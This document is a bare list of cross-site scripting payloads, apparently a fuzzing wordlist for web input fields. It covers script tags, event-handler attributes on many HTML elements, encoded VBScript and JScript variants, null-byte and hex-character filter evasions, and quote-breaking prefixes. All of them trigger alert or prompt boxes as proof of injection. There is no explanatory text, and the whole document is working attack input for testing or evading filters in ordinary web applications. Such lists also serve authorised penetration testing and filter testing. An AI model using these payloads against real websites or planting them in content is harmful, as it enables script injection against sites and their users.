"><SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
'><SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE(“ALERT(1)”)) </SCRIPT>
<IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
"><IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
'><IMG ONERROR=”VBS:EXECSCRIPT LCASE(‘ALERT(1)’)” SRC=A>
<img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
"><img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
'><img onerror=”VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@” src=a>
<img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
"><img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
'><img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
<script>var a = ‘</script><script>alert(1)</script>
"><script>var a = ‘</script><script>alert(1)</script>
'><script>var a = ‘</script><script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<scr%00ipt%20&message=> alert(‘X’)</script>
"><scr%00ipt%20&message=> alert(‘X’)</script>
'><scr%00ipt%20&message=> alert(‘X’)</script>
“<script>prompt(1)</script>
"><script>prompt(1)</script>
'><script>prompt(1)</script>
“;alert(1)//
‘-alert(1)-’
“<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
“;prompt(1)//
‘-prompt(1)-’
<input type="text" AUTOFOCUS onfocus=alert(1)>
"><input type="text" AUTOFOCUS onfocus=alert(1)>
'><input type="text" AUTOFOCUS onfocus=alert(1)>
<script\x20type="text/javascript">javascript:alert(1);</script>
"><script\x20type="text/javascript">javascript:alert(1);</script>
'><script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
"><script\x3Etype="text/javascript">javascript:alert(1);</script>
'><script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
"><script\x0Dtype="text/javascript">javascript:alert(1);</script>
'><script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
"><script\x09type="text/javascript">javascript:alert(1);</script>
'><script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
"><script\x0Ctype="text/javascript">javascript:alert(1);</script>
'><script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
"><script\x2Ftype="text/javascript">javascript:alert(1);</script>
'><script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
"><script\x0Atype="text/javascript">javascript:alert(1);</script>
'><script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
"><img src=1 href=1 onerror="javascript:alert(1)"></img>
'><img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
"><audio src=1 href=1 onerror="javascript:alert(1)"></audio>
'><audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
"><video src=1 href=1 onerror="javascript:alert(1)"></video>
'><video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
"><body src=1 href=1 onerror="javascript:alert(1)"></body>
'><body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
"><image src=1 href=1 onerror="javascript:alert(1)"></image>
'><image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
"><object src=1 href=1 onerror="javascript:alert(1)"></object>
'><object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
"><script src=1 href=1 onerror="javascript:alert(1)"></script>
'><script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
"><svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
'><svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
"><title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
'><title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
"><iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
'><iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
"><body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
'><body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
"><body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
'><body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
"><frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
'><frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
"><script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
'><script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
"><html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
'><html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
"><body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
'><body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
"><svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
'><svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
"><body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
'><body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
"><body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
'><body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
"><body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
'><body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
"><body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
'><body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
"><bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
'><bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
"><html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
'><html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
"><html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
'><html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
"><style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
'><style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
"><iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
'><iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
"><body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
'><body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>